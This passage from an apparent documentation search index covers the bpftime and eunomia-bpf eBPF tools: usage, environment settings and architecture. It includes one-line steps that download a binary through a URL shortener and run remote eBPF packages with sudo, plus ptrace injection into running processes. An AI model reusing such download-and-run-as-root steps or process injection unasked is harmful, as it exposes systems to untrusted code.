project.</p> <p>To get started, you can build and run a libbpf based eBPF program starts with <code>bpftime</code> cli:</p> <pre><code>make -C example/malloc # Build the eBPF program example\nbpftime load ./example/malloc/malloc\n</code></pre> <p>In another shell, Run the target program with eBPF inside:</p> <pre><code>$ bpftime start ./example/malloc/victim\nHello malloc!\nmalloc called from pid 250215\ncontinue malloc...\nmalloc called from pid 250215\n</code></pre> <p>You can also dynamically attach the eBPF program with a running process:</p> <pre><code>$ ./example/malloc/victim &amp; echo $! # The pid is 101771\n[1] 101771\n101771\ncontinue malloc...\ncontinue malloc...\n</code></pre> <p>And attach to it:</p> <pre><code>$ sudo bpftime attach 101771 # You may need to run make install in root\nInject: \"/root/.bpftime/libbpftime-agent.so\"\nSuccessfully injected. ID: 1\n</code></pre> <p>You can see the output from original program:</p> <pre><code>$ bpftime load ./example/malloc/malloc\n...\n12:44:35 \n        pid=247299      malloc calls: 10\n        pid=247322      malloc calls: 10\n</code></pre> <p>Alternatively, you can also run our sample eBPF program directly in the kernel eBPF, to see the similar output:</p> <pre><code>$ sudo example/malloc/malloc\n15:38:05\n        pid=30415       malloc calls: 1079\n        pid=30393       malloc calls: 203\n        pid=29882       malloc calls: 1076\n        pid=34809       malloc calls: 8\n</code></pre>"},{"location":"bpftime/documents/usage/#syscall-tracing","title":"Syscall tracing","text":"<p>An example can be found at examples/opensnoop</p> <pre><code>$ sudo ~/.bpftime/bpftime load ./example/opensnoop/opensnoop\n[2023-10-09 04:36:33.891] [info] manager constructed\n[2023-10-09 04:36:33.892] [info] global_shm_open_type 0 for bpftime_maps_shm\n[2023-10-09 04:36:33][info][23999] Enabling helper groups ffi, kernel, shm_map by default\nPID    COMM              FD ERR PATH\n72101  victim             3   0 test.txt\n72101  victim             3   0 test.txt\n72101  victim             3   0 test.txt\n72101  victim             3   0 test.txt\n</code></pre> <p>In another terminal, run the victim program:</p> <pre><code>$ sudo ~/.bpftime/bpftime start -s example/opensnoop/victim\n[2023-10-09 04:38:16.196] [info] Entering new main..\n[2023-10-09 04:38:16.197] [info] Using agent /root/.bpftime/libbpftime-agent.so\n[2023-10-09 04:38:16.198] [info] Page zero setted up..\n[2023-10-09 04:38:16.198] [info] Rewriting executable segments..\n[2023-10-09 04:38:19.260] [info] Loading dynamic library..\n...\ntest.txt closed\nOpening test.txt\ntest.txt opened, fd=3\nClosing test.txt...\n</code></pre>"},{"location":"bpftime/documents/usage/#run-with-ld_preload-directly","title":"Run with LD_PRELOAD directly","text":"<p>If the command line interface is not enough, you can also run the eBPF program with <code>LD_PRELOAD</code> directly.</p> <p>The command line tool is a wrapper of <code>LD_PRELOAD</code> and can work with <code>ptrace</code> to inject the runtime shared library into a running target process.</p> <p>Run the eBPF tool with libbpf:</p> <pre><code>LD_PRELOAD=build/runtime/syscall-server/libbpftime-syscall-server.so example/malloc/malloc\n</code></pre> <p>Start the target program to trace:</p> <pre><code>LD_PRELOAD=build/runtime/agent/libbpftime-agent.so example/malloc/victim\n</code></pre>"},{"location":"bpftime/documents/usage/#configurations-for-runtime","title":"Configurations for runtime","text":"<p>Some configurations can be set in the environment variables to control the runtime behavior. For the full definition of the environment variables, see https://github.com/eunomia-bpf/bpftime/blob/master/runtime/include/bpftime_config.hpp.</p>"},{"location":"bpftime/documents/usage/#run-with-jit-enabled-or-disabled","title":"Run with JIT enabled or disabled","text":"<p>If the performance is not good enough, you can try to enable JIT. The JIT is enabled by default in new version.</p> <p>Set <code>BPFTIME_DISABLE_JIT=true</code> in the server to disable JIT, for example, when running the server:</p> <pre><code>LD_PRELOAD=~/.bpftime/libbpftime-syscall-server.so BPFTIME_DISABLE_JIT=true example/malloc/malloc\n</code></pre> <p>The JIT may be disabled in old version. Set <code>BPFTIME_USE_JIT=true</code> in the server to enable JIT, for example, when running the server:</p> <pre><code>LD_PRELOAD=~/.bpftime/libbpftime-syscall-server.so BPFTIME_USE_JIT=true example/malloc/malloc\n</code></pre> <p>The default behavior is using LLVM JIT, you can also use ubpf JIT by compile with LLVM JIT enabled. See documents/build-and-test.md for more details.</p>"},{"location":"bpftime/documents/usage/#run-with-kernel-ebpf-and-kernel-verifier","title":"Run with kernel eBPF and kernel verifier","text":"<p>You can run the eBPF program in userspace with kernel eBPF in two ways. The kernel must have eBPF support enabled, and kernel version should be higher enough to support mmap eBPF map.</p> <ul> <li>Use <code>BPFTIME_RUN_WITH_KERNEL</code> to load the eBPF eBPF application with kernel eBPF loader and kernel verifier. The program will be load into the kernel for verify, but can still run in userspace with bpftime agent.</li> <li> <p>Use <code>BPFTIME_NOT_LOAD_PATTERN</code> to skip loading the eBPF program into the kernel when the <code>BPFTIME_RUN_WITH_KERNEL</code> is set. The pattern is a regular expression to match the program name. This can help skip some userspace only eBPF programs which is not supported by kernel verifier.</p> </li> <li> <p>with the shared library <code>libbpftime-syscall-server.so</code>, for example:</p> </li> </ul> <pre><code>BPFTIME_NOT_LOAD_PATTERN=start_.* BPFTIME_RUN_WITH_KERNEL=true LD_PRELOAD=~/.bpftime/libbpftime-syscall-server.so example/malloc/malloc\n</code></pre> <ol> <li>Using daemon mode, see https://github.com/eunomia-bpf/bpftime/tree/master/daemon</li> </ol>"},{"location":"bpftime/documents/usage/#control-log-level","title":"Control Log Level","text":"<p>Set <code>SPDLOG_LEVEL</code> to control the log level dynamically, for example, when running the server:</p> <pre><code>SPDLOG_LEVEL=debug LD_PRELOAD=~/.bpftime/libbpftime-syscall-server.so example/malloc/malloc\n</code></pre> <p>Available log level include:</p> <ul> <li>trace</li> <li>debug</li> <li>info</li> <li>warn</li> <li>err</li> <li>critical</li> <li>off</li> </ul> <p>See https://github.com/gabime/spdlog/blob/v1.x/include/spdlog/cfg/env.h for more details.</p> <p>Log can also be controled at compile time by specifying <code>-DSPDLOG_ACTIVE_LEVEL=SPDLOG_LEVEL_INFO</code> in the cmake compile command.</p>"},{"location":"bpftime/documents/usage/#controlling-the-log-path","title":"Controlling the Log Path","text":"<p>You can control the log output path by setting the <code>BPFTIME_LOG_OUTPUT</code> environment variable. By default, logs are sent to <code>~/.bpftime/runtime.log</code> to avoid polluting the target process. You can override this default behavior by specifying a different log output via the environment variable.</p> <p>To send logs to <code>stderr</code>:</p> <pre><code>BPFTIME_LOG_OUTPUT=console LD_PRELOAD=~/.bpftime/libbpftime-syscall-server.so example/malloc/malloc\n</code></pre> <p>To send logs to a specific file:</p> <pre><code>BPFTIME_LOG_OUTPUT=./mylog.txt LD_PRELOAD=~/.bpftime/libbpftime-syscall-server.so example/malloc/malloc\n</code></pre>"},{"location":"bpftime/documents/usage/#allow-external-maps","title":"Allow external maps","text":"<p>Sometimes you may want to use external maps which bpftime does not support, for example, load a XDP program with a self define map in shared memory, and use own tools to run it.</p> <ul> <li>Set <code>BPFTIME_ALLOW_EXTERNAL_MAPS</code> to allow external(Unsupport) maps load with the bpftime syscall-server library, for example:</li> </ul> <pre><code>BPFTIME_ALLOW_EXTERNAL_MAPS=true LD_PRELOAD=~/.bpftime/libbpftime-syscall-server.so userspace-xdp/xdp_loader\n</code></pre>"},{"location":"bpftime/documents/usage/#set-memory-size-for-shared-memory-maps","title":"Set memory size for shared memory maps","text":"<p>Sometimes larger maps may need more memory, you can set the memory size for shared memory maps by setting <code>BPFTIME_SHM_MEMORY_MB</code> in the server. The size is in MB, for example, when running the server:</p> <pre><code>BPFTIME_SHM_MEMORY_MB=1024 LD_PRELOAD=~/.bpftime/libbpftime-syscall-server.so example/malloc/malloc\n</code></pre>"},{"location":"bpftime/documents/usage/#verifier","title":"Verifier","text":"<p>Since the primary goal of bpftime is to stay aligned with kernel eBPF, it is recommended to use the kernel's eBPF verifier to ensure program safety.</p> <p>You can set the <code>BPFTIME_RUN_WITH_KERNEL</code> environment variable to allow the program to load into the kernel and be verified by the kernel verifier:</p> <pre><code>BPFTIME_RUN_WITH_KERNEL=true LD_PRELOAD=~/.bpftime/libbpftime-syscall-server.so example/malloc/malloc\n</code></pre> <p>If the kernel verifier is not available, you can enable the <code>ENABLE_EBPF_VERIFIER</code> option during the bpftime build process to use the <code>PREVAIL</code> userspace eBPF verifier:</p> <pre><code>cmake -DENABLE_EBPF_VERIFIER=YES -DCMAKE_BUILD_TYPE=Release -S . -B build\n</code></pre> <p>Share on  Share on </p>"},{"location":"eunomia-bpf/","title":"eunomia-bpf: simplify and enhance eBPF with CO-RE<sup>1</sup> and WebAssembly<sup>2</sup>","text":"<p>A compiler and runtime framework to help you build and distribute eBPF program easier.</p>"},{"location":"eunomia-bpf/#introduction","title":"Introduction","text":"<p><code>eunomia-bpf</code> is a dynamic loading library/runtime and a compile toolchain framework, aim at helping you build and distribute eBPF programs easier.</p> <p>With eunnomia-bpf, you can:</p> <ul> <li>A library to simplify <code>writing</code> eBPF programs:</li> <li>simplify building CO-RE<sup>1</sup> <code>libbpf</code> eBPF applications: write eBPF kernel code only and automatically exposing your data with <code>perf event</code> or <code>ring buffer</code> from kernel.</li> <li>Automatically sample the data from hash maps and print <code>hists</code> in userspace.</li> <li>Automatically generate and config <code>command line arguments</code> for eBPF programs.</li> <li>You can writing the kernel part in both <code>BCC</code> and <code>libbpf</code> styles.</li> <li>Build eBPF programs with <code>Wasm</code><sup>2</sup>: see <code>Wasm-bpf</code> project</li> <li>Runtime, libraries and toolchains to write eBPF with Wasm in C/C++, Rust, Go...covering the use cases from <code>tracing</code>, <code>networking</code>, <code>security</code>.</li> <li>simplify <code>distributing</code> eBPF programs:</li> <li>A tool for push, pull and run pre-compiled eBPF programs as <code>OCI</code> images in Wasm module</li> <li>Run eBPF programs from <code>cloud</code> or <code>URL</code> within <code>1</code> line of bash without recompiling, kernel version and architecture independent.</li> <li>Dynamically load eBPF programs with <code>JSON</code> config file or <code>Wasm</code> module.</li> </ul> <p>For more information, see documents/introduction.md.</p>"},{"location":"eunomia-bpf/#getting-started","title":"Getting Started","text":"<ul> <li>Github Template\uff1aeunomia-bpf/ebpm-template</li> <li>example bpf programs: examples/bpftools</li> <li>tutorial: eunomia-bpf/bpf-developer-tutorial</li> </ul>"},{"location":"eunomia-bpf/#run-as-cli-tool-or-server","title":"run as cli tool or server","text":"<p>You can get pre-compiled eBPF programs running from the cloud to the kernel in <code>1</code> line of bash:</p> <pre><code># download the release from https://github.com/eunomia-bpf/eunomia-bpf/releases/latest/download/ecli\n$ wget https://aka.pw/bpf-ecli -O ecli &amp;&amp; chmod +x ./ecli\n$ sudo ./ecli run https://eunomia-bpf.github.io/eunomia-bpf/sigsnoop/package.json # simply run a pre-compiled ebpf code from a url\nINFO [bpf_loader_lib::skeleton] Running ebpf program...\nTIME     PID    TPID   SIG    RET    COMM   \n01:54:49  77297 8042   0      0      node\n01:54:50  77297 8042   0      0      node\n01:54:50  78788 78787  17     0      which\n01:54:50  78787 8084   17     0      sh\n01:54:50  78790 78789  17     0      ps\n01:54:50  78789 8084   17     0      sh\n01:54:50  78793 78792  17     0      sed\n01:54:50  78794 78792  17     0      cat\n01:54:50  78795 78792  17     0      cat\n\n$ sudo ./ecli run ghcr.io/eunomia-bpf/execve:latest # run with a name and download the latest version bpf tool from our repo\n[79130] node -&gt; /bin/sh -c which ps \n[79131] sh -&gt; which ps \n[79132] node -&gt; /bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,c \n[79133] sh -&gt; /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command= \n[79134] node -&gt; /bin/sh -c \"/home/yunwei/.vscode-server/bin/2ccd690cbf \n[79135] sh -&gt; /home/yunwei/.vscode-server/bin/2ccd690cbff 78132 79119 79120 79121 \n[79136] cpuUsage.sh -&gt; sed -n s/^cpu\\s//p /proc/stat\n</code></pre> <p>You can also use a server to manage and dynamically install eBPF programs.</p> <p>Start the server:</p> <pre><code>$ sudo ./ecli-server\n[2023-08-08 02:02:03.864009 +08:00] INFO [server/src/main.rs:95] Serving at 127.0.0.1:8527\n</code></pre> <p>Use the ecli to control the remote server and manage multiple eBPF programs:</p> <pre><code>$ ./ecli client start sigsnoop.json # start the program\n1\n$ ./ecli client log 1 # get the log of the program\nTIME     PID    TPID   SIG    RET    COMM   \n02:05:58  79725 78132  17     0      bash\n02:05:59  77325 77297  0      0      node\n02:05:59  77297 8042   0      0      node\n02:05:59  77297 8042   0      0      node\n02:05:59  79727 79726  17     0      which\n02:05:59  79726 8084   17     0      sh\n02:05:59  79731 79730  17     0      which\n</code></pre> <p>For more information, see documents/src/ecli/server.md.</p>"},{"location":"eunomia-bpf/#install-the-project","title":"Install the project","text":"<ul> <li> <p>Install the <code>ecli</code> tool for running eBPF program from the cloud:</p> <pre><code>$ wget https://aka.pw/bpf-ecli -O ecli &amp;&amp; chmod +x ./ecli\n$ ./ecli -h\necli subcommands, including run, push, pull, login, logout\n\nUsage: ecli-rs [PROG] [EXTRA_ARGS]... [COMMAND]\n\nCommands:\n  run     run ebpf program\n  client  Client operations\n  push    \n  pull    pull oci image from registry\n  login   login to oci registry\n  logout  logout from registry\n  help    Print this message or the help of the given subcommand(s)\n\nArguments:\n  [PROG]           Not preferred. Only for compatibility to older versions. Ebpf program URL or local path, set it `-` to read the program from stdin\n  [EXTRA_ARGS]...  Not preferred. Only for compatibility to older versions. Extra args to the program; For wasm program, it will be passed directly to it; For JSON program, it will be passed to the generated argument parser\n\nOptions:\n  -h, --help  Print help\n....\n</code></pre> </li> <li> <p>Install the <code>ecc</code> compiler-toolchain for compiling eBPF kernel code to a <code>config</code> file or <code>Wasm</code> module(<code>clang</code>, <code>llvm</code>, and <code>libclang</code> should be installed for compiling):</p> <pre><code>$ wget https://github.com/eunomia-bpf/eunomia-bpf/releases/latest/download/ecc &amp;&amp; chmod +x ./ecc\n$ ./ecc -h\neunomia-bpf compiler\nUsage: ecc [OPTIONS] &lt;SOURCE_PATH&gt; [EXPORT_EVENT_HEADER]\n....\n</code></pre> </li> </ul> <p>or use the docker image for compile:</p> <pre><code>```bash\n# for x86_64 and aarch64\ndocker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest # compile with docker. `pwd` should contains *.bpf.c files and *.h files.\n```\n</code></pre> <ul> <li>build the compiler, runtime library and tools:</li> </ul> <p>see build for building details.</p>"},{"location":"eunomia-bpf/#examples","title":"Examples","text":"<p>See examples for details about simple eBPF tools and eunomia-bpf library usage.</p> <p>See github.com/eunomia-bpf/wasm-bpf/tree/main/examples for Wasm eBPF programs and examples.</p> <p>We also have a prove of concept video: Writing eBPF programs in Wasm.</p>"},{"location":"eunomia-bpf/#license","title":"License","text":"<p>MIT LICENSE</p> <p>Share on  Share on </p> <ol> <li> <p>CO-RE: Compile Once \u2013 Run Everywhere \u21a9\u21a9</p> </li> <li> <p>WebAssembly or Wasm: https://webassembly.org/ \u21a9\u21a9</p> </li> </ol>"},{"location":"eunomia-bpf/benchmark/","title":"benchmark","text":"<p>Most of the time, bpf-loader work as a library to load eBPF program. It will not affect eBPF program after the program has been loaded and attached.</p> <p>TODO: add more benchmark results</p>"},{"location":"eunomia-bpf/benchmark/#benchmark-for-loading-with-exporter","title":"benchmark for loading with exporter","text":"<p>Take opensnoop from bcc/libbpf-tools as an example. starting with BCC, you will need about 0.8s to start the exporter and attach to the probe. With out implement, you only need about <code>50-70ms</code> which is significantly faster.</p> <pre><code>$ ps -aux | grep eunomia\nroot      171562  0.0  0.0  15176  4576 pts/6    S+   01:08   0:00 sudo ./eunomia-exporter\nroot      171605  0.1  0.0 350540  7740 pts/6    Sl+  01:08   0:00 ./eunomia-exporter\n</code></pre> <p>The memory usage and CPU usage is also low. see eunomia-exporter for more details.</p> <p>Share on  Share on </p>"},{"location":"eunomia-bpf/introduction/","title":"introduction","text":"<p><code>eunomia-bpf</code> is a dynamic loading library/runtime and a compile toolchain framework, aim at helping you build and distribute eBPF programs easier.</p>"},{"location":"eunomia-bpf/introduction/#simplify-building-co-re-libbpf-ebpf-applications","title":"Simplify building CO-RE libbpf eBPF applications","text":"<p>Just Write libbpf eBPF kernel code only, auto config the userspace part!</p>"},{"location":"eunomia-bpf/introduction/#automatically-exposing-your-data-from-kernel","title":"Automatically exposing your data from kernel","text":"<ul> <li> <p>Get data automatically from <code>perf event</code> or <code>ring buffer</code> to userspace:</p> <pre><code>struct {\n  __uint(type, BPF_MAP_TYPE_RINGBUF);\n  __uint(max_entries, 256 * 1024);\n} rb SEC(\".maps\");\n\nSEC(\"tp/sched/sched_process_exec\")\nint handle_exec(struct trace_event_raw_sched_process_exec *ctx)\n{\n  ....\n  e = bpf_ringbuf_reserve(&amp;rb, sizeof(*e), 0);\n  ....\n  bpf_ringbuf_submit(e, 0);\n  return 0;\n}\n</code></pre> <p>Compile and Run the program:</p> <pre><code>$ ecc bootstrap.bpf.c bootstrap.h\nCompiling bpf object...\nGenerating export types...\nPacking ebpf object and config into package.json...\n$ sudo ./ecli examples/bpftools/bootstrap/package.json\nTIME     PID     PPID    EXIT_CODE  DURATION_NS  COMM    FILENAME  EXIT_EVENT\n22:01:04  46310  2915    0          0            sh      /bin/sh   0\n22:01:04  46311  46310   0          0            which   /usr/bin/which 0\n22:01:04  46311  46310   0          2823776      which             1\n22:01:04  46310  2915    0          6288891      sh                1\n22:01:04  46312  2915    0          0            sh      /bin/sh   0\n22:01:04  46313  46312   0          0            ps      /usr/bin/ps 0\n</code></pre> <p>see bootstrap for example. This is exactly the same as bootstrap.bpf.c in libbpf-bootstrap project, but only kernel code is needed.</p> </li> </ul>"},{"location":"eunomia-bpf/introduction/#automatically-sample-the-data-and-print-hists-in-userspace","title":"Automatically sample the data and print <code>hists</code> in userspace","text":"<ul> <li> <p>Sample the data from hash maps and print them in human readable format with comments:</p> <pre><code>/// @sample {\"interval\": 1000, \"type\" : \"log2_hist\"}\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, MAX_ENTRIES);\n    __type(key, u32);\n    __type(value, struct hist);\n} hists SEC(\".maps\");\n</code></pre> <p>and Get <code>hist</code> data from <code>hists</code> map and print them in human readable format:</p> <pre><code>$ sudo ecli  examples/bpftools/runqlat/package.json --targ_per_process\nkey = 8326\ncomm = containerd\n\n      usec              : count    distribution\n        0 -&gt; 1          : 0        |                                        |\n        2 -&gt; 3          : 0        |                                        |\n        4 -&gt; 7          : 0        |                                        |\n        8 -&gt; 15         : 0        |                                        |\n       16 -&gt; 31         : 2        |*************                           |\n       32 -&gt; 63         : 2        |*************                           |\n       64 -&gt; 127        : 6        |****************************************|\n      128 -&gt; 255        : 0        |                                        |\n      256 -&gt; 511        : 2        |*************                           |\n</code></pre> <p>see examples/bpftools/mdflush.bpf.c for example.</p> </li> </ul>"},{"location":"eunomia-bpf/introduction/#automatically-generate-and-config-command-line-arguments","title":"Automatically generate and config command line arguments","text":"<ul> <li> <p>Automatically generate and config command line arguments for your eBPF program from the comments in your kernel code:</p> <pre><code>/// Process ID to trace\nconst volatile pid_t pid_target = 0;\n/// Thread ID to trace\nconst volatile pid_t tgid_target = 0;\n/// @description User ID to trace\nconst volatile uid_t uid_target = 0;\n/// @cmdarg {\"default\": false, \"short\": \"f\", \"long\": \"failed\"}\n/// @description target pid to trace\nconst volatile bool targ_failed = false;\n</code></pre> <p>and Get:</p> <pre><code>$ sudo ecli  examples/bpftools/opensnoop/package.json -h\nUsage: opensnoop_bpf [--help] [--version] [--verbose] [--pid_target VAR] [--tgid_target VAR] [--uid_target VAR] [--failed]\n\nTrace open family syscalls.\n\nOptional arguments:\n  -h, --help    shows help message and exits\n  -v, --version prints version information and exits\n  --verbose     prints libbpf debug information\n  --pid_target  Process ID to trace\n  --tgid_target Thread ID to trace\n</code></pre> <p>see examples/bpftools/opensnoop/opensnoop.bpf.c for example.</p> </li> <li> <p><code>100%</code> compatible with <code>libbpf</code>, libbpf-bootstrap and <code>libbpf-rs</code>, etc: you can compile libbpf-tools kernel code with <code>eunomia-bpf</code> and run them without many modification!</p> </li> <li>Not limited to tracing: support <code>tracepoints</code>, <code>kprobe</code>, <code>uprobe</code>, <code>lsm</code>, <code>xdp</code>, <code>tc</code> etc...</li> </ul>"},{"location":"eunomia-bpf/introduction/#compile-and-pack-co-re-ebpf-kernel-code-to-a-config-file","title":"Compile and pack CO-RE eBPF kernel code to a config file","text":"<ul> <li> <p>Compile and pack CO-RE eBPF kernel code to a <code>JSON</code> or <code>YAML</code> config file:</p> <pre><code>$ ecc cmd/test/opensnoop.bpf.c opensnoop.h\nCompiling bpf object...\nGenerating export types...\nPacking ebpf object and config into package.json...\n$ docker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest # build with docker for x86_64 and aarch64\nPacking ebpf object and config into package.json...\n</code></pre> <p>You can modify the config file and config the eBPF program behavior to your need.</p> </li> </ul>"},{"location":"eunomia-bpf/introduction/#dynamic-load-and-run-co-re-ebpf-kernel-code-from-the-cloud-with-url-or-oci-image","title":"Dynamic load and run CO-RE eBPF kernel code from the cloud with URL or OCI image","text":"<ul> <li> <p>you can dynamically load it on different kernel version without recompile, and without clang/llvm dependency:</p> <pre><code>$ sudo ecli opensnoop.json\nTIME     PID     TPID    SIG     RET     COMM\n22:58:28  77121  3168    0       0       cpptools-srv\n22:58:29  69044  3168    0       0       cpptools-srv\n22:58:29  3014   2906    0       0       code\n22:58:29  6952   4061    0       0       node\n22:58:29  4061   3937    0       0       node\n22:58:29  75263  3168    0       0       cpptools-srv\n22:58:29  2906   2488    0       0       code\n22:58:29  69149  3168    0       0       cpptools-srv\n22:58:29  73541  3168    0       0       cpptools-srv\n22:58:29  73468  3168    0       0       cpptools-srv\n22:58:29  2906   2488    0       0       code\n22:58:29  69094  3168    0       0       cpptools-srv\n</code></pre> </li> <li> <p>Get pre-compiled eBPF programs running from the cloud to the kernel in <code>1</code> line of bash, kernel version and architecture independent:</p> <pre><code># download the release from https://github.com/eunomia-bpf/eunomia-bpf/releases/latest/download/ecli\n$ wget https://aka.pw/bpf-ecli -O ecli &amp;&amp; chmod +x ./ecli\n$ sudo ./ecli https://eunomia-bpf.github.io/eunomia-bpf/sigsnoop/package.json # simply run a pre-compiled ebpf code from a url\n$ sudo ./ecli sigsnoop:latest # run with a name and download the latest version bpf tool from our repo\n</code></pre> </li> <li> <p>very small and simple! The library itself <code>&lt;1MB</code> and no <code>LLVM/Clang</code> dependence, can be embedded easily in you project</p> </li> <li>as fast as <code>&lt;100ms</code> and little resource need to dynamically load and run eBPF program</li> </ul> <p>Base on <code>eunomia-bpf</code>, we have an eBPF pacakge manager in LMP project, with OCI images and ORAS for distribution.</p>"},{"location":"eunomia-bpf/introduction/#wasm-bpf-write-user-space-code-for-your-ebpf-program-in-webassembly","title":"wasm-bpf: Write user space code for your eBPF program in WebAssembly","text":"<p>see wasm-bpf project:</p> <p>A WebAssembly eBPF library, toolchain and runtime powered by CO-RE(Compile Once \u2013 Run Everywhere) libbpf and WAMR.</p> <ul> <li><code>General purpose</code>: provide most abilities from eBPF to Wasm, <code>polling</code> from the ring buffer or perf buffer, bidirectional communications between <code>kernel</code> eBPF and <code>userspace</code> Wasm using <code>maps</code>, dynamically <code>loading</code>, <code>attaching</code> or <code>detaching</code>, etc. Supports a large number of eBPF program types and map types, covering the use cases from <code>tracing</code>, <code>networking</code>, <code>security</code>.</li> <li><code>High performance</code>: No <code>serialization</code> overhead for complex data types, using <code>shared memory</code> to avoid copy overhead between host and Wasm.</li> <li><code>Easy to use</code>: provide a similar developing experience as the libbpf-bootstrap, <code>auto generate</code> the Wasm-eBPF skeleton headers and type definitions for bindings.</li> <li><code>Ultralightweight</code>: the sample runtime has only <code>300+</code> lines of code, binary only <code>1.5 MB</code> in size. Compiled Wasm module would be only <code>~90K</code>. With the same toolchain, you can easily build your own Wasm-eBPF runtime in any languages and platforms!</li> </ul>"},{"location":"eunomia-bpf/introduction/#project-architecture","title":"Project Architecture","text":"<p>we have a loader library, a compile toolchain, and some additional tools like cli and a custom metrics exporter.</p> <p></p>"},{"location":"eunomia-bpf/introduction/#an-bpf-loader-rs-library","title":"An bpf-loader-rs library","text":"<p>A wrapper of main functions of libbpf-rs, provide the ability to dynamically load eBPF code to the kernel and run it with a simple JSON and a few API.</p> <p>A simple cli interface is provided for bpf-loader library, which you can use it to start any eBPF program from a url in a command. You can download it from release.</p> <p>see examples for more examples.</p>"},{"location":"eunomia-bpf/introduction/#a-library-to-load-and-operate-ebpf-program-from-a-wasm-module","title":"A library to load and operate eBPF program from a WASM module","text":"<p>Use the <code>eunomia-bpf</code> library to load <code>eBPF</code> program from a <code>WASM</code> module, you can write a WASM module to operate the eBPF program or process the data in user space <code>WASM</code> runtime. The idea is simple:</p> <ol> <li>compile the kernel eBPF code skeleton to the <code>JSON</code> format with <code>eunomia-cc</code> toolchain</li> <li>embed the <code>JSON</code> data in the <code>WASM</code> module, and provide some API for operating the eBPF program skeleton</li> <li>load the <code>JSON</code> data from the <code>WASM</code> module and run the eBPF program skeleton with <code>eunomia-bpf</code> library</li> </ol> <p>You can have multiple <code>eBPF</code> program in a single <code>WASM</code> module.</p> <p>See wasm-runtime for details. In fact, <code>ewasm</code> library only exports a few functions from <code>bpf-loader</code> library to the <code>VM</code>, so you can replace the <code>WASM</code> runtime with your own easily.</p> <p>For example, you can run an eBPF program with a WASM module for an URL:</p> <pre><code>sudo ./ecli run https://eunomia-bpf.github.io/eunomia-bpf/sigsnoop/app.wasm\n</code></pre> <p>You can also generate a WASM program template for eBPF or build WASM module with <code>compiler</code> container:</p> <pre><code># for x86_64 and aarch64\ndocker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest gen-wasm-skel # generate WASM app template for eBPF\ndocker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest build-wasm    # Build WASM module\n</code></pre> <p>see sigsnoop example for more detail.</p>"},{"location":"eunomia-bpf/introduction/#a-compile-toolchain-to-help-you-generate-pre-compiled-ebpf-data","title":"A compile toolchain to help you generate pre compiled eBPF data","text":"<p>The toolchain can be used as a docker to generate pre-compiled eBPF data in one command:</p> <p>see the compile toolchains compiler for details.</p> <p>you can also simply use the ebpm-template repo as a template in github, just push to it and github action can help you compile CO-RE ebpf code!</p>"},{"location":"eunomia-bpf/introduction/#other-related-projects","title":"other related projects","text":"<ul> <li> <p>LMP eBPF Hub: github.com/linuxkerneltravel/lmp</p> <p>a package manager for eBPF based on wasm modules</p> </li> <li> <p>bolipi online compiler &amp; runner: https://bolipi.com/ebpf/home/online</p> <p>an online compiler and runner for eBPF program newbies</p> </li> <li> <p>An Observability tool</p> <p>An prometheus and OpenTelemetry exporter for custom eBPF metrics, written in async rust: eunomia-exporter. You can compile it or download from release</p> </li> </ul>"},{"location":"eunomia-bpf/introduction/#build-the-project","title":"build the project","text":"<p>see build for details.</p> <p>Share on  Share on </p>"},{"location":"eunomia-bpf/manual/","title":"eunomia-bpf \u7528\u6237\u624b\u518c: \u8ba9 eBPF \u7a0b\u5e8f\u7684\u5f00\u53d1\u548c\u90e8\u7f72\u5c3d\u53ef\u80fd\u7b80\u5355","text":"<p>\u4f20\u7edf\u6765\u8bf4\uff0c eBPF \u7684\u5f00\u53d1\u65b9\u5f0f\u4e3b\u8981\u6709 BCC\u3001libbpf \u7b49\u65b9\u5f0f\u3002\u8981\u5b8c\u6210\u4e00\u4e2a BPF \u4e8c\u8fdb\u5236\u7a0b\u5e8f\u7684\u5f00\u53d1\uff0c\u9700\u8981\u642d\u5efa\u5f00\u53d1\u7f16\u8bd1\u73af\u5883\uff0c\u8981\u5173\u6ce8\u76ee\u6807\u7cfb\u7edf\u7684\u5185\u6838\u7248\u672c\u60c5\u51b5\uff0c\u9700\u8981\u638c\u63e1\u4ece BPF \u5185\u6838\u6001\u5230\u7528\u6237\u6001\u7a0b\u5e8f\u7684\u7f16\u5199\uff0c\u4ee5\u53ca\u5982\u4f55\u52a0\u8f7d\u3001\u7ed1\u5b9a\u81f3\u5bf9\u5e94\u7684 HOOK \u70b9\u7b49\u5f85\u4e8b\u4ef6\u89e6\u53d1\uff0c\u6700\u540e\u518d\u5bf9\u8f93\u51fa\u7684\u65e5\u5fd7\u53ca\u6570\u636e\u8fdb\u884c\u5904\u7406\u3002</p> <p>\u6211\u4eec\u5e0c\u671b\u6709\u8fd9\u6837\u4e00\u79cd eBPF \u7684\u7f16\u8bd1\u548c\u8fd0\u884c\u5de5\u5177\u94fe\uff0c\u5c31\u50cf\u5176\u4ed6\u5f88\u591a\u8bed\u8a00\u4e00\u6837\uff1a</p> <ul> <li> <p>\u5927\u591a\u6570\u7528\u6237\u53ea\u9700\u8981\u5173\u6ce8 <code>bpf.c</code> \u7a0b\u5e8f\u672c\u8eab\u7684\u7f16\u5199\uff0c\u4e0d\u9700\u8981\u5199\u4efb\u4f55\u5176\u4ed6\u7684\u4ec0\u4e48 Python, Clang \u4e4b\u7c7b\u7684\u7528\u6237\u6001\u8f85\u52a9\u4ee3\u7801\u6846\u67b6\uff1b   \u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u5206\u53d1\u3001\u91cd\u7528 eBPF \u7a0b\u5e8f\u672c\u8eab\uff0c\u800c\u4e0d\u9700\u8981\u548c\u67d0\u79cd\u6216\u51e0\u79cd\u8bed\u8a00\u7684\u751f\u6001\u7ed1\u5b9a\uff1b</p> </li> <li> <p>\u6700\u5927\u7a0b\u5ea6\u4e0a\u548c\u4e3b\u6d41\u7684 libbpf \u6846\u67b6\u5b9e\u73b0\u517c\u5bb9\uff0c\u539f\u5148\u4f7f\u7528 libbpf 